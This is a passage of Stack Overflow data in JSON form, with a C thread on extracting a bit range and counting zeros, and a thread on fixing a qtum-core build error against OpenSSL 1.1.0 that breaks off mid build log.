"creation_date": 1517992998, "post_id": 48659321, "comment_id": 84316093, "body": "While this code snippet may solve the question, <a href=\"//meta.stackexchange.com/questions/114762/explaining-entirely-code-based-answers\">including an explanation</a> really helps to improve the quality of your post. Remember that you are answering the question for readers in the future, and those people might not know the reasons for your code suggestion. Please also try not to crowd your code with explanatory comments, this reduces the readability of both the code and the explanations!"}, {"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 0, "creation_date": 1517993033, "post_id": 48659321, "comment_id": 84316111, "body": "this is for a particular example. I want do it for random values. Istead of 5th posiotion it can be 6th also"}], "tags": [], "owner": {"reputation": 609, "user_id": 7690030, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c11846ade17a8760f2501ab72fcc1f37?s=128&d=identicon&r=PG", "display_name": "Martin Chekurov", "link": "https://stackoverflow.com/users/7690030/martin-chekurov"}, "is_accepted": false, "score": 0, "last_activity_date": 1517993527, "last_edit_date": 1517993527, "creation_date": 1517992955, "answer_id": 48659321, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48659321#48659321", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<pre><code>int result = (0xA5 &gt;&gt; 2) &amp; 0x0F;\n</code></pre>\n\n<p>Truth table for the <code>&amp;</code> operator</p>\n\n<pre><code> |    INPUTS  | OUTPUT |\n -----------------------\n |  0   |  0  |    0   |\n |  0   |  1  |    0   |\n |  1   |  0  |    0   |  \n |  1   |  1  |    1   |\n -----------------------  \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 2, "creation_date": 1517993090, "post_id": 48659336, "comment_id": 84316145, "body": "<code>&amp;&amp;</code> is the logical and, the bitwise and is <code>&amp;</code>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1517993103, "post_id": 48659336, "comment_id": 84316150, "body": "First of all, bits 2 to 5 are <i>four</i> bits. Secondly, you&#39;re using the <i>logical</i> and operator. The result of <code>a &amp;&amp; mask</code> will be <code>1</code>, <i>always</i>."}], "tags": [], "owner": {"reputation": 290, "user_id": 7427772, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/110ca972b1adb456c71100a18b1cf3d3?s=128&d=identicon&r=PG&f=1", "display_name": "Nark", "link": "https://stackoverflow.com/users/7427772/nark"}, "is_accepted": false, "score": 1, "last_activity_date": 1517993968, "last_edit_date": 1517993968, "creation_date": 1517993004, "answer_id": 48659336, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48659336#48659336", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<p>You could use a mask and the \"&amp;\" (AND) operation:</p>\n\n<pre><code>a = 0xA5;\na = a &gt;&gt; OFFSET; //OFFSET \nmask = 0x0F; // equals 00001111\na = a &amp; mask; \n</code></pre>\n\n<p>In your example a = 0xA5 (10100101), and the offset is 2. </p>\n\n<ul>\n<li>a >> 2 a now equals to 0x29 (00101001) </li>\n<li>a &amp; 0x0F (00101001 AND\n00001111) = 00001001 = 0x09</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 1859, "user_id": 2157639, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/faaf63a16923788f63d2a2b68c8d3c6b?s=128&d=identicon&r=PG", "display_name": "Ivan  Ivanov", "link": "https://stackoverflow.com/users/2157639/ivan-ivanov"}, "is_accepted": false, "score": 1, "last_activity_date": 1517993511, "creation_date": 1517993511, "answer_id": 48659462, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48659462#48659462", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<p>In this example we put 0 or 1 values into array. After that you can treat array as you like.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nint main(int argc, char **argv) {\n    uint8_t value = 0xA5;\n    unsigned char bytes[8];\n    unsigned char i;\n\n    for (i = 0; i &lt; 8; i++) {\n        bytes[i] = (value &amp; (1 &lt;&lt; i)) != 0 ? 1 : 0;\n    }\n\n    for (i = 0; i &lt; 8; i++) {\n        printf(\"%d\", bytes[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 1, "creation_date": 1517996853, "post_id": 48659465, "comment_id": 84318523, "body": "Here the position y can change. Basically what I meant is number of zeros from xth position to the next position which having value 1."}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "reply_to_user": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 0, "creation_date": 1517997384, "post_id": 48659465, "comment_id": 84318884, "body": "@Salim your question doesn&#39;t make that clear. I think you should post it as a separate question showing the details properly, because this has been adequately answered by a lot of users."}, {"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 1, "creation_date": 1517997447, "post_id": 48659465, "comment_id": 84318926, "body": "@Ayan : I have already this in my question &quot;The main idea is whichever bit is set to 1 after 2nd bit. I have to extract that..&quot;"}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "reply_to_user": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 0, "creation_date": 1517998461, "post_id": 48659465, "comment_id": 84319595, "body": "I don&#39;t know the exact edit time, but the question has changed significantly after the edit. I strongly suggest posting a separate question. I can edit my answer to accommodate your change, but it wouldn&#39;t be fair to other answers and leave those answers not coherent with the new version of the question. You can roll back this question and then post a new question. I am sure nobody would mind similar but different questions. Just make sure you make the intent clear with adequate examples and/or clearly worded description."}], "tags": [], "owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "is_accepted": false, "score": 2, "last_activity_date": 1517994469, "last_edit_date": 1517994469, "creation_date": 1517993520, "answer_id": 48659465, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48659465#48659465", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<p>Assuming you are dealing with <code>unsigned int</code> for your variable. \nYou will have to construct the appropriate mask. </p>\n\n<p>Suppose you want the bits from position <code>x</code> to position <code>y</code>, there need to be <code>y - x + 1</code> <code>1s</code> in the mask. </p>\n\n<p>You can get this by -</p>\n\n<pre><code>int digits = y - x + 1;\nunsigned int mask = 1u &lt;&lt; digits - 1;\n</code></pre>\n\n<p>Now you need to remove the lower <code>x</code> bits from the initial number, which be done by - </p>\n\n<pre><code>unsigned int result = number &gt;&gt; x;\n</code></pre>\n\n<p>Finally apply the mask to remove the upper bits - </p>\n\n<pre><code>result = result &amp; mask;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 1, "creation_date": 1517995657, "post_id": 48659658, "comment_id": 84317691, "body": "Actually we dont have any control on variable &quot;bits&quot;. I mean it can be 4,5... But it is postion of the next 1 after shifting with the offset"}, {"owner": {"reputation": 739, "user_id": 8281970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/abHXs.jpg?s=128&g=1", "display_name": "Ketan Mukadam", "link": "https://stackoverflow.com/users/8281970/ketan-mukadam"}, "edited": false, "score": 0, "creation_date": 1517995909, "post_id": 48659658, "comment_id": 84317878, "body": "If your aim is extract the first set bit after <code>offset</code> bit, simply use <code>while(value)</code> and check each bit if it is set or not. When bit is set break, else continue the loop."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "edited": false, "score": 0, "creation_date": 1517996976, "post_id": 48659658, "comment_id": 84318620, "body": "@Salim When you say &quot;position of the next 1&quot;, you don&#39;t mean the first <code>1</code> bit? Because then with the input <code>0xa5</code> we would count only one bit (since bit 0 is <code>1</code>). What are the rules for &quot;next 1&quot;? If you have <code>1001</code> (as in your example) it&#39;s the <i>second</i> <code>1</code>, but what if you have <code>1010</code>? Or <code>1100</code>? Or <code>1000</code>? Please edit your question to elaborate on the actual, specific and all requirements. And if possible add more examples."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1517994420, "last_edit_date": 1517994420, "creation_date": 1517994116, "answer_id": 48659658, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48659658#48659658", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<p>If you want bits from the offset <code>X</code> then shift right by <code>X</code>.</p>\n\n<p>If you want <code>Y</code> bits, then then mask (after the shift) will be 2 to the power of <code>Y</code> minus one (for your example with four bits, 2 to the power of 4 is 16, minus one is 15 which is <code>1111</code> binary). This can be dome by using left-shifting by <code>Y</code> bits and subtracting <code>1</code>.</p>\n\n<p>However, the masking isn't needed if you want to count the number of zeros in the wanted bits, only the right shift. Loop <code>Y</code> times, each time shifting a <code>1</code> left one step, and check using bitwise and if the value is zero. If it is then increment a counter. At the end of the loop the counter is the number of zeros.</p>\n\n<hr>\n\n<p>To put it all in code:</p>\n\n<pre><code>// Count the number of zeros in a specific amount of bits starting at a specific offset\n// value is the original value\n// offset is the offset in bits\n// bits is the number of bits to check\nunsigned int count_zeros(unsigned int value, unsigned int offset, unsigned int bits)\n{\n    // Get the bits we're interested in the rightmost position\n    value &gt;&gt;= offset;\n\n    unsigned int counter = 0;  // Zero-counter\n    for (unsigned int i = 0; i &lt; bits; ++i)\n    {\n        if ((value &amp; (1 &lt;&lt; i)) == 0)\n        {\n            ++counter;  // Bit is a zero\n        }\n    }\n\n    return counter;\n}\n</code></pre>\n\n<p>To use with the example data you have:</p>\n\n<pre><code>count_zeros(0xa5, 2, 4);\n</code></pre>\n\n<p>The result should be <code>2</code>. Which it is <a href=\"https://ideone.com/bEujqx\" rel=\"nofollow noreferrer\">if you see this live program</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1517999859, "post_id": 48661408, "comment_id": 84320584, "body": "For the problem you mention, there is a solution possible without actually using loops. Just so you know."}, {"owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "reply_to_user": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1518004452, "post_id": 48661408, "comment_id": 84323547, "body": "@Ayan How can we  do without loops ?"}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1518004504, "post_id": 48661408, "comment_id": 84323576, "body": "Like I said before, you need to ask a separate question for that."}], "tags": [], "owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "is_accepted": false, "score": 1, "last_activity_date": 1517999227, "creation_date": 1517999227, "answer_id": 48661408, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c/48661408#48661408", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<pre><code>int32_t do_test(int32_t value, int32_t offset)\n{\n    int32_t _zeros = 1;\n    value &gt;&gt;= offset;    \n\n    int i = 1;\n\n    while(1) {\n        if((value &gt;&gt; i) % 2 == 0) {\n            _zeros += 1;\n            i++;\n        } else {\n            break;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 265, "user_id": 8953281, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/69d09d598912cb37d56adce43bfaa804?s=128&d=identicon&r=PG&f=1", "display_name": "Salim", "link": "https://stackoverflow.com/users/8953281/salim"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 103, "favorite_count": 0, "answer_count": 6, "score": 1, "last_activity_date": 1517999227, "creation_date": 1517992574, "last_edit_date": 1517993407, "question_id": 48659216, "link": "https://stackoverflow.com/questions/48659216/extracting-a-particular-range-of-bits-and-find-number-of-zeros-between-them-in-c", "title": "Extracting a particular range of bits and find number of zeros between them in C", "body": "<p>I want to extract a particular range of bits in an integer variable.</p>\n\n<p>For example: 0xA5 (10100101)</p>\n\n<p>I want to extract from bit2 to bit5. i.e 1001 to a variable and count number of zeros between them. </p>\n\n<p>I have another variable which give the starting point, which means in this case the value of the variable is 2. So the starting point can be find by 0xA5 >> 2.\n5th bit position is a random position here..means it can be 6 or 7. The main idea is whichever bit is set to 1 after 2nd bit. I have to extract that..</p>\n\n<p>How can I do rest of the part ?</p>\n"}, {"tags": ["c++", "c", "makefile", "openssl", "ubuntu-14.04"], "answers": [{"tags": [], "owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "is_accepted": true, "score": 0, "last_activity_date": 1518064186, "last_edit_date": 1518064186, "creation_date": 1518060536, "answer_id": 48677063, "question_id": 48658890, "link": "https://stackoverflow.com/questions/48658890/qtum-core-build-issue-when-compiling-with-openssl/48677063#48677063", "title": "qtum-core build issue when compiling with OpenSSL", "body": "<blockquote>\n<pre><code>  CXX      libbitcoin_common_a-key.o\nkey.cpp: In function \u2018bool EnsureLowS(std::vector&lt;unsigned char&gt;&amp;)\u2019:\nkey.cpp:149:19: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n     if (BN_cmp(sig-&gt;s, halforder) &gt; 0) {\n                   ^\n</code></pre>\n</blockquote>\n\n<p>It looks like your machine has OpenSSL 1.1.0 locally, but the qtum-core is written for OpenSSL 1.0.2. That's because of the <em><code>incomplete type ECDSA_SIG</code></em> error. OpenSSL 1.1.0 made a bunch of things private in OpenSSL 1.1.0 that used to be public and accessible in OpenSSL 1.0.2.</p>\n\n<p>You can do two things. First, downgrade to OpenSSL 1.0.2 so qtum-core can access the data members again.</p>\n\n<p>Second, you can upgrade qtum-core to a version that is OpenSSL 1.1.0 aware. If qtum-core is not OpenSSL 1.1.0 aware, then file a bug report to let the authors know about the problem.</p>\n\n<p>The problem you are asking about may be <a href=\"https://github.com/qtumproject/qtum/issues/382\" rel=\"nofollow noreferrer\">Qtum Issue 382</a>. If so, then it looks like your only choice is Option (1), downgrade to OpenSSL 1.0.2.</p>\n\n<hr>\n\n<p>Here is how to configure with a different OpenSSL (i.e., a different on than the one from a distribution).</p>\n\n<pre><code>$ git clone https://github.com/qtumproject/qtum.git\n$ cd qtum/\n$ autoreconf -f -i\nlibtoolize: putting auxiliary files in AC_CONFIG_AUX_DIR, 'build-aux'.\nlibtoolize: copying file 'build-aux/ltmain.sh'\nlibtoolize: putting macros in AC_CONFIG_MACRO_DIRS, 'build-aux/m4'.\nlibtoolize: copying file 'build-aux/m4/libtool.m4'\nlibtoolize: copying file 'build-aux/m4/ltoptions.m4'\nlibtoolize: copying file 'build-aux/m4/ltsugar.m4'\nlibtoolize: copying file 'build-aux/m4/ltversion.m4'\nlibtoolize: copying file 'build-aux/m4/lt~obsolete.m4'\n...\n</code></pre>\n\n<p>Here is the important part, before running make:</p>\n\n<pre><code>$ ./configure --help | grep -i -E 'ssl|crypto'\n  SSL_CFLAGS  C compiler flags for SSL, overriding pkg-config\n  SSL_LIBS    linker flags for SSL, overriding pkg-config\n  CRYPTO_CFLAGS\n              C compiler flags for CRYPTO, overriding pkg-config\n  CRYPTO_LIBS linker flags for CRYPTO, overriding pkg-config\n</code></pre>\n\n<p>There are no <code>--with-XXX</code> options to control OpenSSL, but it can be picked up through <code>pkg-config</code>. So...</p>\n\n<p>I install upgrades in <code>/usr/local</code>. Headers are in <code>/usr/local/include</code>, and libraries are in <code>/usr/local/lib64</code> (because it is Fedora). The local version of OpenSSL is 1.0.2:</p>\n\n<pre><code>$ cat /usr/local/lib64/pkgconfig/libssl.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib64\nincludedir=${prefix}/include\n\nName: OpenSSL-libssl\nDescription: Secure Sockets Layer and cryptography libraries\nVersion: 1.0.2n\nRequires.private: libcrypto\nLibs: -L${libdir} -lssl\nLibs.private: -Wl,-R,/usr/local/lib64 -Wl,--enable-new-dtags -ldl\nCflags: -I${includedir}\n\n$ cat /usr/local/lib64/pkgconfig/libcrypto.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib64\nincludedir=${prefix}/include\nenginesdir=${libdir}/engines\n\nName: OpenSSL-libcrypto\nDescription: OpenSSL cryptography library\nVersion: 1.0.2n\nRequires:\nLibs: -L${libdir} -lcrypto\nLibs.private: -Wl,-R,/usr/local/lib64 -Wl,--enable-new-dtags -ldl\nCflags: -I${includedir}\n</code></pre>\n\n<p>I am ready to build. The next step is (<code>--disable-wallet</code> because I don't feel like fixing the Autools errors):</p>\n\n<pre><code>$ PKG_CONFIG_PATH=/usr/local/lib64/pkgconfig/ ./configure --disable-wallet\nconfigure: loading site script /usr/local/share/config.site\nchecking build system type... x86_64-pc-linux-gnu\nchecking host system type... x86_64-pc-linux-gnu\nchecking for a BSD-compatible install... /usr/local/bin/install -c\nchecking whether build environment is sane... yes\nchecking for a thread-safe mkdir -p... /usr/local/bin/mkdir -p\nchecking for gawk... gawk\n...\nchecking for dynamic linked boost test... yes\nchecking for mismatched boost c++11 scoped enums... ok\nchecking for SSL... yes\nchecking for CRYPTO... yes\n...\n</code></pre>\n\n<hr>\n\n<p>Related, I have some scripts to install OpenSSL and some other programs at <a href=\"https://github.com/noloader/Build-Scripts\" rel=\"nofollow noreferrer\">Noloader | Build-Scripts</a>. Clone the repo, then run:</p>\n\n<pre><code>./build-cacerts.sh  # install CA's needed for Wget downloads\n./build-openssl.sh  # download, build and install OpenSSL in /usr/local\n</code></pre>\n\n<p>I use the build scripts for downlevel clients, like Fedora 7 and Solaris 10. You don't have to use the build scripts. But you do need to get a copy of OpenSSL 1.0.2 installed locally.</p>\n"}], "owner": {"reputation": 13, "user_id": 9326168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f6be4bac7fa18180d9cbeabbcab20748?s=128&d=identicon&r=PG&f=1", "display_name": "\ub178\uc8fc\ud604", "link": "https://stackoverflow.com/users/9326168/%eb%85%b8%ec%a3%bc%ed%98%84"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 755, "favorite_count": 1, "accepted_answer_id": 48677063, "answer_count": 1, "score": 0, "last_activity_date": 1518064186, "creation_date": 1517991351, "last_edit_date": 1518060260, "question_id": 48658890, "link": "https://stackoverflow.com/questions/48658890/qtum-core-build-issue-when-compiling-with-openssl", "title": "qtum-core build issue when compiling with OpenSSL", "body": "<p>I am getting an error trying to build qtum-core. The error is:</p>\n\n<pre><code>make\n...\n\n  CXX      libbitcoin_common_a-key.o\nkey.cpp: In function \u2018bool EnsureLowS(std::vector&lt;unsigned char&gt;&amp;)\u2019:\nkey.cpp:149:19: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n     if (BN_cmp(sig-&gt;s, halforder) &gt; 0) {\n                   ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nkey.cpp:151:19: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n         BN_sub(sig-&gt;s, order, sig-&gt;s);\n                   ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nkey.cpp:151:34: error: invalid use of incomplete type \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n         BN_sub(sig-&gt;s, order, sig-&gt;s);\n                                  ^\nIn file included from /usr/include/openssl/ecdsa.h:10:0,\n                 from key.cpp:17:\n/usr/include/openssl/ec.h:1039:16: error: forward declaration of \u2018ECDSA_SIG {aka struct ECDSA_SIG_st}\u2019\n typedef struct ECDSA_SIG_st ECDSA_SIG;\n                ^\nmake[2]: *** [libbitcoin_common_a-key.o] Error 1\nmake[2]: Leaving directory `/home/qtum_data/qtum/src'\nmake[1]: *** [all-recursive] Error 1\nmake[1]: Leaving directory `/home/qtum_data/qtum/src'\nmake: *** [all-recursive] Error 1\n</code></pre>\n\n<p>What is the problem and how do I fix it?</p>\n\n<hr>\n\n<ol>\n<li><code>git clone --recursive https://github.com/qtumproject/qtum.git</code></li>\n<li><code>cd qtum</code></li>\n<li><p>Run <code>autogen</code></p>\n\n<pre><code>./autogen.sh\nlibtoolize: putting auxiliary files in AC_CONFIG_AUX_DIR, `build-aux'.\nlibtoolize: copying file `build-aux/ltmain.sh'\nlibtoolize: putting macros in AC_CONFIG_MACRO_DIR, `build-aux/m4'.\nlibtoolize: copying file `build-aux/m4/libtool.m4'\nlibtoolize: copying file `build-aux/m4/ltoptions.m4'\nlibtoolize: copying file `build-aux/m4/ltsugar.m4'\nlibtoolize: copying file `build-aux/m4/ltversion.m4'\n...\nconfigure.ac:32: installing 'build-aux/missing'\nMakefile.am:12: warning: user variable 'GZIP_ENV' defined here ...\n/usr/share/automake-1.14/am/distdir.am: ... overrides Automake variable 'GZIP_ENV' defined here\nsrc/Makefile.am: installing 'build-aux/depcomp'\nsrc/Makefile.am:703: warning: user target '.mm.o' defined here ...\n/usr/share/automake-1.14/am/depend2.am: ... overrides Automake target '.mm.o' defined here\nparallel-tests: installing 'build-aux/test-driver'\n</code></pre></li>\n<li><p>Configure</p>\n\n<pre><code>./configure --without-gui\nchecking build system type... x86_64-unknown-linux-gnu\nchecking host system type... x86_64-unknown-linux-gnu\nchecking for a BSD-compatible install... /usr/bin/install -c\nchecking whether build environment is sane... yes\nchecking for a thread-safe mkdir -p... /bin/mkdir -p\nchecking for gawk... no\nchecking for mawk... mawk\nchecking whether make sets $(MAKE)... yes\nchecking whether make supports nested variables... yes\nchecking whether to enable maintainer-specific portions of Makefiles... yes\nchecking whether make supports nested variables... (cached) yes\nchecking for g++... g++\n...\n\nconfigure: Using jni: no\nconfigure: ******\nconfigure: WARNING: experimental build\nconfigure: Experimental features do not have stable APIs or properties, and may not be safe for production use.\nconfigure: Building ECDH module: yes\nconfigure: ******\nchecking that generated files are newer than configure... done\nconfigure: creating ./config.status\nconfig.status: creating Makefile\nconfig.status: creating libsecp256k1.pc\nconfig.status: creating src/libsecp256k1-config.h\nconfig.status: executing depfiles commands\nconfig.status: executing libtool commands\nFixing libtool for -rpath problems.\n\nOptions used to compile and link:\n  with wallet   = yes\n  with gui / qt = no\n  with zmq      = no\n  with test     = yes\n  with bench    = yes\n  with upnp     = auto\n  debug enabled = no\n  werror        = no\n\n  target os     = linux\n  build os      =\n\n  CC            = gcc\n  CFLAGS        = -g -O2\n  CPPFLAGS      =  -DQTUM_BUILD -DHAVE_BUILD_INFO -D__STDC_FORMAT_MACROS\n  CXX           = g++ -std=c++11\n  CXXFLAGS      = -g -O2 -Wall -Wextra -Wformat -Wvla -Wformat-security -Wno-unused-parameter -Wno-unknown-pragmas\n  LDFLAGS       =\n</code></pre></li>\n<li><p>Make</p>\n\n<pre><code>make    \nMaking all in src\nmake[1]: Entering directory `/home/qtum_data/qtum/src'\nmake[2]: Entering directory `/home/qtum_data/qtum/src'\n  CXX      crypto/libbitcoinconsensus_la-aes.lo\n  CXX      crypto/libbitcoinconsensus_la-chacha20.lo\n  CXX      crypto/libbitcoinconsensus_la-hmac_sha256.lo\n  CXX      crypto/libbitcoinconsensus_la-hmac_sha512.lo\n  CXX      crypto/libbitcoinconsensus_la-ripemd160.lo\n  CXX      crypto/libbitcoinconsensus_la-sha1.lo\n  CXX      crypto/libbitcoinconsensus_la-sha256.lo\n  CXX      crypto/libbitcoinconsensus_la-sha512.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-b64.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto-mcf.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto_scrypt-check.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto_scrypt-hash.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto_scrypt-hexconvert.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto_scrypt-nosse.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-crypto-scrypt-saltgen.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-sha256.lo\n  CC       cpp-ethereum/utils/libscrypt/libbitcoinconsensus_la-slowequals.lo\n  CXX      libbitcoinconsensus_la-arith_uint256.lo\n  CXX      consensus/libbitcoinconsensus_la-merkle.lo\n  CXX      libbitcoinconsensus_la-hash.lo\n  CXX      primitives/libbitcoinconsensus_la-block.lo\n  CXX      primitives/libbitcoinconsensus_la-transaction.lo\n  CXX      libbitcoinconsensus_la-pubkey.lo\n  CXX      script/libbitcoinconsensus_la-bitcoinconsensus.lo\n  CXX      script/libbitcoinconsensus_la-interpreter.lo\n  CXX      script/libbitcoinconsensus_la-script.lo\n  CXX      script/libbitcoinconsensus_la-script_error.lo\n  CXX      libbitcoinconsensus_la-uint256.lo\n  CXX      